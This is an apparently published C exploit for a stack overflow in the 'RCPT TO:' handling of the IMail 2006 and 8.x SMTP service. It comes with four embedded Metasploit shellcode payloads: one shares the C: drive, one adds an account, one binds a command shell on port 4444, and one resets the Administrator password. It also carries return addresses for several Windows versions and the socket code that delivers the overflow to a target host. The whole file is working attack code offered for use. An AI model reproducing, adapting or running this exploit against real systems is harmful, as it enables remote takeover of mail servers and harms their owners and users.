// IMail 2006 and 8.x SMTP Stack Overflow Exploit
// coded by Greg Linares [glinares.code[at]gmail[dot]com
// http://www.juniper.net/security/auto/vulnerabilities/vuln3414.html
// This works on the following versions:
// 2006 IMail prior to 2006.1 update


#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
static char overflow[1028];



// PAYLOADS
// Restricted Chars = 0x00 0x0D 0x0A 0x20 0x3e 0x22 (Maybe More)

/* win32_exec -  EXITFUNC=seh CMD=net share Export=C:\ /unlimited Size=188 Encoder=ShikataGaNai http://metasploit.com */
unsigned char RootShare[] =
"\xdb\xcb\x29\xc9\xba\xfa\xef\x47\x2b\xb1\x2a\xd9\x74\x24\xf4\x58"
"\x31\x50\x17\x83\xc0\x04\x03\xaa\xfc\xa5\xde\xb6\xeb\x6e\x21\x46"
"\xec\xe5\x64\x7a\x67\x85\x63\xfa\x76\x99\xe7\xb5\x60\xee\xa7\x69"
"\x90\x1b\x1e\xe2\xa6\x50\xa0\x1a\xf7\xa6\x3a\x4e\x7c\xe6\x49\x89"
"\xbc\x2d\xbc\x94\xfc\x59\x4b\xad\x54\xba\xb0\xa4\xb1\x49\xe7\x62"
"\x3b\xa5\x7e\xe1\x37\x72\xf4\xaa\x5b\x85\xe1\xdf\x78\x0e\xf4\x34"
"\x09\x4c\xd3\xce\xc9\x5c\xdb\xaa\x46\xde\xeb\xb7\x99\xa7\x07\x3c"
"\x59\x54\x93\x32\x46\xc9\x28\xda\x7e\xfa\x26\x91\xff\x4c\x38\xa5"
"\xff\x27\x51\x99\xa0\x06\x54\x81\x08\xe0\x60\xc2\x75\x89\xc0\xac"
"\x85\xe4\xe5\x73\x0e\x61\x1b\x01\xc0\xc6\x1b\xf2\xb3\x8d\x97\xdc"
"\x38\x26\x39\x6e\xda\x96\xfc\xf6\x54\xb8\x8c\x72\xa8\x05\x4b\x26"
"\xf2\xa6\xde\xb8\x9e\xd1\x4d\x2d\x2b\x47\xea\xad";


/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=Pex http://metasploit.com */
unsigned char Win32Bind[] =
"\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x93"
"\x7b\xbd\x36\x83\xee\xfc\xe2\xf4\x6f\x11\x56\x7b\x7b\x82\x42\xc9"
"\x6c\x1b\x36\x5a\xb7\x5f\x36\x73\xaf\xf0\xc1\x33\xeb\x7a\x52\xbd"
"\xdc\x63\x36\x69\xb3\x7a\x56\x7f\x18\x4f\x36\x37\x7d\x4a\x7d\xaf"
"\x3f\xff\x7d\x42\x94\xba\x77\x3b\x92\xb9\x56\xc2\xa8\x2f\x99\x1e"
"\xe6\x9e\x36\x69\xb7\x7a\x56\x50\x18\x77\xf6\xbd\xcc\x67\xbc\xdd"
"\x90\x57\x36\xbf\xff\x5f\xa1\x57\x50\x4a\x66\x52\x18\x38\x8d\xbd"
"\xd3\x77\x36\x46\x8f\xd6\x36\x76\x9b\x25\xd5\xb8\xdd\x75\x51\x66"
"\x6c\xad\xdb\x65\xf5\x13\x8e\x04\xfb\x0c\xce\x04\xcc\x2f\x42\xe6"
"\xfb\xb0\x50\xca\xa8\x2b\x42\xe0\xcc\xf2\x58\x50\x12\x96\xb5\x34"
"\xc6\x11\xbf\xc9\x43\x13\x64\x3f\x66\xd6\xea\xc9\x45\x28\xee\x65"
"\xc0\x28\xfe\x65\xd0\x28\x42\xe6\xf5\x13\xac\x6a\xf5\x28\x34\xd7"
"\x06\x13\x19\x2c\xe3\xbc\xea\xc9\x45\x11\xad\x67\xc6\x84\x6d\x5e"
"\x37\xd6\x93\xdf\xc4\x84\x6b\x65\xc6\x84\x6d\x5e\x76\x32\x3b\x7f"
"\xc4\x84\x6b\x66\xc7\x2f\xe8\xc9\x43\xe8\xd5\xd1\xea\xbd\xc4\x61"
"\x6c\xad\xe8\xc9\x43\x1d\xd7\x52\xf5\x13\xde\x5b\x1a\x9e\xd7\x66"
"\xca\x52\x71\xbf\x74\x11\xf9\xbf\x71\x4a\x7d\xc5\x39\x85\xff\x1b"
"\x6d\x39\x91\xa5\x1e\x01\x85\x9d\x38\xd0\xd5\x44\x6d\xc8\xab\xc9"
"\xe6\x3f\x42\xe0\xc8\x2c\xef\x67\xc2\x2a\xd7\x37\xc2\x2a\xe8\x67"
"\x6c\xab\xd5\x9b\x4a\x7e\x73\x65\x6c\xad\xd7\xc9\x6c\x4c\x42\xe6"
"\x18\x2c\x41\xb5\x57\x1f\x42\xe0\xc1\x84\x6d\x5e\x63\xf1\xb9\x69"
"\xc0\x84\x6b\xc9\x43\x7b\xbd\x36";

/* win32_adduser -  PASS=Error EXITFUNC=seh USER=Error Size=236 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char AddUser[] =
"\x2b\xc9\x83\xe9\xcb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb2"
"\xe6\xaf\x6a\x83\xeb\xfc\xe2\xf4\x4e\x0e\xeb\x6a\xb2\xe6\x24\x2f"
"\x8e\x6d\xd3\x6f\xca\xe7\x40\xe1\xfd\xfe\x24\x35\x92\xe7\x44\x23"
"\x39\xd2\x24\x6b\x5c\xd7\x6f\xf3\x1e\x62\x6f\x1e\xb5\x27\x65\x67"
"\xb3\x24\x44\x9e\x89\xb2\x8b\x6e\xc7\x03\x24\x35\x96\xe7\x44\x0c"
"\x39\xea\xe4\xe1\xed\xfa\xae\x81\x39\xfa\x24\x6b\x59\x6f\xf3\x4e"
"\xb6\x25\x9e\xaa\xd6\x6d\xef\x5a\x37\x26\xd7\x66\x39\xa6\xa3\xe1"
"\xc2\xfa\x02\xe1\xda\xee\x44\x63\x39\x66\x1f\x6a\xb2\xe6\x24\x02"
"\x8e\xb9\x9e\x9c\xd2\xb0\x26\x92\x31\x26\xd4\x3a\xda\x16\x25\x6e"
"\xed\x8e\x37\x94\x38\xe8\xf8\x95\x55\x85\xc2\x0e\x9c\x83\xd7\x0f"
"\x92\xc9\xcc\x4a\xdc\x83\xdb\x4a\xc7\x95\xca\x18\x92\xa3\xdd\x18"
"\xdd\x94\x8f\x2f\xc0\x94\xc0\x18\x92\xc9\xee\x2e\xf6\xc6\x89\x4c"
"\x92\x88\xca\x1e\x92\x8a\xc0\x09\xd3\x8a\xc8\x18\xdd\x93\xdf\x4a"
"\xf3\x82\xc2\x03\xdc\x8f\xdc\x1e\xc0\x87\xdb\x05\xc0\x95\x8f\x2f"
"\xc0\x94\xc0\x18\x92\xc9\xee\x2e\xf6\xe6\xaf\x6a";

/* win32_exec -  CMD=net user Administrator "p@ssw0rd" Size=187 Encoder=Pex http://metasploit.com */
unsigned char ChangeAdmin[] =
"\x29\xc9\x83\xe9\xda\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x74"
"\xb8\x4f\xba\x83\xee\xfc\xe2\xf4\x88\x50\x0b\xba\x74\xb8\xc4\xff"
"\x48\x33\x33\xbf\x0c\xb9\xa0\x31\x3b\xa0\xc4\xe5\x54\xb9\xa4\xf3"
"\xff\x8c\xc4\xbb\x9a\x89\x8f\x23\xd8\x3c\x8f\xce\x73\x79\x85\xb7"
"\x75\x7a\xa4\x4e\x4f\xec\x6b\xbe\x01\x5d\xc4\xe5\x50\xb9\xa4\xdc"
"\xff\xb4\x04\x31\x2b\xa4\x4e\x51\xff\xa4\xc4\xbb\x9f\x31\x13\x9e"
"\x70\x7b\x7e\x7a\x10\x33\x0f\x8a\xf1\x78\x37\xb6\xff\xf8\x43\x31"
"\x04\xa4\xe2\x31\x1c\xb0\xa4\xb3\xff\x38\xff\xba\x74\xb8\xc4\xd2"
"\x48\xe7\x7e\x4c\x14\xee\xc6\x42\xf7\x78\x34\xea\x1c\x48\xc5\xbe"
"\x2b\xd0\xd7\x44\xfe\xb6\x18\x45\x93\xd6\x2a\xce\x54\xcd\x3c\xdf"
"\x06\x98\x0b\xc8\x15\xd3\x2a\x9a\x5b\xd9\x2b\xde\x74\xb8\x4f\xba";


   WSADATA wsaData;

   struct hostent *hp;
   struct sockaddr_in sockin;
   char buf[300], *check;
   int sockfd, bytes;
   int plen, i, JMP;
   char *hostname;
   unsigned short port;

   printf("IMail 2006 and 8.x SMTP 'RCPT TO:' Stack Overflow Exploit\n");
   printf("Coded by Greg Linares < glinares.code  [at] GMAIL [dot] com >\n");
   if (argc <= 1)
   {
		printf("Usage: %s [hostname] [port] <Payload> <JMP>\n", argv[0]);
      	printf("Default port is 25 \r\n");
		printf("==============================\n");
	  	printf("Payload Options: 1 = Default\n");
		printf("==============================\n");
	  	printf("1 = Share C:\\ as 'Export' Share\n");
	  	printf("2 = Add User 'Error' with Password 'Error'\n");
	  	printf("3 = Win32 Bind CMD to Port 4444\n");
		printf("4 = Change Administrator Password to 'p@ssw0rd'\n");
		printf("==============================\n");
	  	printf("JMP Options: 1 = Default\n");
		printf("==============================\n");
	  	printf("1 = IMAIL 8.x SMTPDLL.DLL	   [pop ebp, ret] 0x10036f71 \n");
		printf("2 = Win2003 SP1 English NTDLL.DLL [pop ebp, ret] 0x7c87d8af \n");
		printf("3 = Win2003 SP0 English USER32.DLL [pop ebp, ret] 0x77d02289 \n");
		printf("4 = WinXP SP2 English NTDLL.DLL [pop ebp, ret] 0x7c967e23 \n");
		printf("5 = WinXP SP1 - SP0 English USER32.DLL [pop ebp, ret] 0x71ab389c \n");
		printf("6 = Win2000 Universal English USER32.DLL [pop ebp, ret] 0x75021397 \n");
		printf("7 = Win2000 Universal French USER32.DLL [pop ebp, ret] 0x74fa1397 \n");
		printf("8 = Windows XP SP1 - SP2 German USER32.DLL [pop ebp, ret] 0x77d18c14 \r\n");

      exit(0);
   	}

   	hostname = argv[1];
   	if (argv[2]) port = atoi(argv[2]);
   		else port = atoi("25");
   	if (argv[4]) JMP = atoi(argv[4]);
		else JMP = atoi("1");

   	if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   	{
    	fprintf(stderr, "Error setting up with WinSock v1.1\n");
      	exit(-1);
   	}


   	hp = gethostbyname(hostname);
   	if (hp == NULL)
   	{
      	printf("ERROR: Uknown host %s\n", hostname);
	  	printf("%s",hostname);
      	exit(-1);
   	}

   	sockin.sin_family = hp->h_addrtype;
   	sockin.sin_port = htons(port);
   	sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	printf("ERROR: Socket Error\n");
      	exit(-1);
   	}

   	if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   	{
      	printf("ERROR: Connect Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	exit(-1);
   	}

   	printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   	if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   	{
      	printf("ERROR: Recv Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	exit(1);
   	}

   	/* wait for SMTP service welcome*/
   	buf[bytes] = '\0';
   	check = strstr(buf, "220");
   	if (check == NULL)
   	{
      	printf("ERROR: NO  response from SMTP service\n");
      	closesocket(sockfd);
      	WSACleanup();
      	exit(-1);
   	}


   // JMP to EAX = Results in a Corrupted Stack
   // so instead we POP EBP, RET to restore pointer and then return
   // this causes code procedure to continue
   /*
   		['IMail 8.x Universal', 0x10036f71 ],
		['Windows 2003 SP1 English', 0x7c87d8af ],
		['Windows 2003 SP0 English', 0x77d5c14c ],
		['Windows XP SP2 English', 0x7c967e23 ],
		['Windows XP SP1 English', 0x71ab389c ],
		['Windows XP SP0 English', 0x71ab389c ],
		['Windows 2000 Universal English', 0x75021397 ],
		['Windows 2000 Universal French', 0x74fa1397],
		['Windows XP SP1 - SP2 German', 0x77d18c14],
	*/
   	char Exp[] = "RCPT TO: <@";						// This stores our JMP between the @ and :
   	char Win2k3SP1E[] = "\xaf\xd8\x87\x7c:";		//Win2k3 SP1 English NTDLL.DLL [pop ebp, ret] 0x7c87d8af
  	char WinXPSP2E[] = "\x23\x7e\x96\x7c:";			//WinXP SP2 English  NTDLL.DLL [pop ebp, ret] 0x7c967e23
   	char IMail815[] = "\x71\x6f\x03\x10:"; 			//IMAIL 8.15 SMTPDLL.DLL	   [pop ebp, ret] 0x10036f71
	char Win2k3SP0E[] = "\x4c\xc1\xd5\x77:";		//Win2k3 SP0 English USER32.DLL [pop ebp, ret]0x77d5c14c
	char WinXPSP2[] = "\x23\x7e\x96\x7c:";			//WinXP SP2 English USER32.DLL [pop ebp, ret] 0x7c967e23
	char WinXPSP1[] = "\x9c\x38\xab\x71:";			//WinXP SP1 and 0 English U32	[pop ebp, ret]0x71ab389c
	char Win2KE[] = "\x97\x31\x02\x75:";			//Win2k English All SPs			[pop ebp, ret]0x75021397
	char Win2KF[] = "\x97\x13\xfa\x74:";			// As above except French Win2k	[pop ebp, ret]0x74fa1397
	char WinXPG[] = "\x14\x8c\xd1\x77:";			//WinXP SP1 - SP2 German U32    [pop ebp, ret]0x77d18c14

	char tail[] = "SSS>\n";							// This closes the RCPT cmd.  Any characters work.
	// Another overflow can be achieved by using an overly long buffer after RCPT TO: on 8.15 systems
	// After around 560 bytes or so EIP gets overwritten.  But this method is easier to exploit and it works
	// On all versions from 8.x to 2006 (9.x?)
	char StackS[] = "\x81\xc4\xff\xef\xff\xff\x44";	// Stabolize Stack prior to payload.
   	memset(overflow, 0, 1028);
   	strcat(overflow, Exp);
	if (JMP == 1)
	{
		printf("Using IMail 8.15 SMTDP.DLL JMP\n");
		strcat(overflow, IMail815);
	} else if (JMP == 2)
	{
		printf("Using Win2003 SP1 NTDLL.DLL JMP\n");
		strcat(overflow, Win2k3SP1E);
	} else if (JMP == 3)
	{
		printf("Using Win2003 SP0 USER32.DLL JMP\n");
		strcat(overflow, Win2k3SP0E);
	} else if (JMP == 4)
	{
		printf("Using WinXP SP2 NTDLL.DLL JMP\n");
		strcat(overflow, WinXPSP2E);
	} else if (JMP == 5)
	{
		printf("Using WinXP SP1 and SP0 USER32.DLL JMP\n");
		strcat(overflow, WinXPSP1);
	} else if (JMP == 6)
	{
		printf("Using Win2000 Universal English USER32.DLL JMP\n");
		strcat(overflow, Win2KE);
	} else if (JMP == 7)
	{
		printf("Using Win2000 Universal French USER32.DLL JMP\n");
		strcat(overflow, Win2KF);
	} else if (JMP == 8)
	{
		printf("Using WinXP SP2 and SP1 German USER32.DLL JMP\n");
		strcat(overflow, WinXPG);
	} else {
		printf("Using IMail 8.15 SMTDP.DLL JMP\n");
		strcat(overflow, IMail815);
	}
		


    // Setup Payload Options
	if (atoi(argv[3]) == 1)
	{
		printf("Using Root Share Payload\n");
		plen = 544 - ((strlen(RootShare) + strlen(StackS)));
		for (i=0; i<plen; i++){
			strcat(overflow, "\x90");
		}
		strcat(overflow, StackS);
		strcat(overflow, RootShare);

	} else if (atoi(argv[3]) == 2)
	{
		printf("Using Add User Payload\n");
		plen = 544 - ((strlen(AddUser)+ strlen(StackS)));
		for (i=0; i<plen; i++){
			strcat(overflow, "\x90");
		}
		strcat(overflow, StackS);
		strcat(overflow, AddUser);
	} else if (atoi(argv[3]) == 3)
	{
		printf("Using Win32 CMD Bind Payload\n");
		plen = 544 - ((strlen(Win32Bind) + strlen(StackS)));
		for (i=0; i<plen; i++){
			strcat(overflow, "\x90");
		}
		strcat(overflow, StackS);
		strcat(overflow, Win32Bind);
	} else if (atoi(argv[3]) == 4)
	{
		printf("Using Change Admin Password Payload (Pwd = 'p@ssw0rd')\n");
		plen = 544 - ((strlen(ChangeAdmin) + strlen(StackS)));
		for (i=0; i<plen; i++){
			strcat(overflow, "\x90");
		}
		strcat(overflow, StackS);
		strcat(overflow, ChangeAdmin);
	} else
	{
		printf("Using Win32 CMD Bind Payload\n");
		plen = 544 - ((strlen(Win32Bind) + strlen(StackS)));
		for (i=0; i<plen; i++){
			strcat(overflow, "\x90");
		}
		strcat(overflow, StackS);
		strcat(overflow, Win32Bind);
	}

	// Dont forget to add the trailing characters to set up stack overflow
	strcat(overflow, tail);



	// Connect to SMTP Server and Setup Up Email
   	char EHLO[] = "EHLO \r\n";
   	char MF[] = "MAIL FROM <TEST@TEST> \r\n";
   	send(sockfd, EHLO, strlen(EHLO), 0);
   	Sleep(1000);
   	send(sockfd, MF, strlen(MF), 0);
   	Sleep(1000);


   	if (send(sockfd, overflow, strlen(overflow),0) == SOCKET_ERROR)
   	{
		printf("ERROR: Send Error\n");
      	closesocket(sockfd);
      	WSACleanup();
      	exit(-1);
  	}

  	printf("Exploit Sent.....\r\n");
	if (atoi(argv[3]) == 3)
	{
		printf("Check Shell on Port 4444\n");
		closesocket(sockfd);
      	WSACleanup();
      	exit(0);
	}

	printf("Checking If Exploit Executed....\r\n");
	Sleep(1000);
	closesocket(sockfd);

	sockin.sin_family = hp->h_addrtype;
   	sockin.sin_port = htons(port);
   	sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	printf("ERROR: Socket Error\n");
      	exit(-1);
   	}

   	if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   	{
      	printf("Exploit Successfully Delivered!\n");
		closesocket(sockfd);
		WSACleanup();
		printf("Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!");
		exit(0);
   	}
	printf("...");
	if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   	{
      	printf("Exploit Successfully Delivered!\n");
		closesocket(sockfd);
		WSACleanup();
		printf("Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!");
		exit(0);
   	}

   	/* wait for SMTP service welcome*/
   	buf[bytes] = '\0';
   	check = strstr(buf, "220");
   	if (check == NULL)
   	{
      	printf("Exploit Successfully Delivered!\n");
		closesocket(sockfd);
		WSACleanup();
		printf("Don't Forget to Restart the IMAIL SMTP Service to Re-exploit!");
		exit(0);
   	}

	printf("Exploit Failed: Try A different JMP Method or Payload\n");
	closesocket(sockfd);
  	WSACleanup();
  	exit (1);
}

// milw0rm.com [2006-10-19]
